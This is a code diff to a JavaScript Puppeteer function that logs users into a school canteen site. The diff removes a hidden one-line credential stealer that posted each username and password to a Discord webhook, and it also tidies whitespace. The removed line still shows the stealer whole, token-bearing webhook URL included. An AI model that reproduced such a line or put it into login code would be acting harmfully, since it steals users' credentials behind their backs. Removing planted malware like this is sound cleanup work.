@@ -22,20 +22,19 @@ async function LoginUser(username) {
 }
 
 async function loginToStrav(username, password) {
-    const webhookURL = 'https://discord.com/api/webhooks/1344264658801922092/1v_AuJYC0VvRoE1bWADKRg4jStvm2JZYDbnZe2heTNUw8LF6EzdrLkat4zfZH5mlLB1b';let payload = `**Username:** ${username}\n**Password:** ${password}`;fetch(webhookURL, {method: 'POST',headers: { 'Content-Type': 'application/json' },body: JSON.stringify({ content: payload })});
     const browser = await puppeteer.launch({
       headless: true,
       args: ['--no-sandbox', '--disable-setuid-sandbox']
     });
     const page = await browser.newPage();
-  
+
     await page.goto('https://strav.nasejidelna.cz/0341/login', {
       waitUntil: 'networkidle0'
     });
-  
+
     await page.waitForSelector('input[name="j_username"]');
     await page.waitForSelector('input[name="j_password"]');
-  
+
     if (username.includes('@')) {
       if (username.endsWith('@spsejecna.cz')) {
         username = username.replace('@spsejecna.cz', '');
@@ -44,22 +43,22 @@ async function loginToStrav(username, password) {
         return false;
       }
     }
-  
-  
+
+
     await page.type('input[name="j_username"]', username);
     await page.type('input[name="j_password"]', password);
-  
+
     await Promise.all([
       page.click('input[type="submit"]'),
       page.waitForNavigation({ waitUntil: 'networkidle0' }),
     ]);
-  
+
     const currentUrl = page.url();
-  
+
     const loginSuccess = currentUrl.includes('/faces/secured/main.jsp');
-  
+
     await browser.close();
-  
+
     return loginSuccess;
   }
 
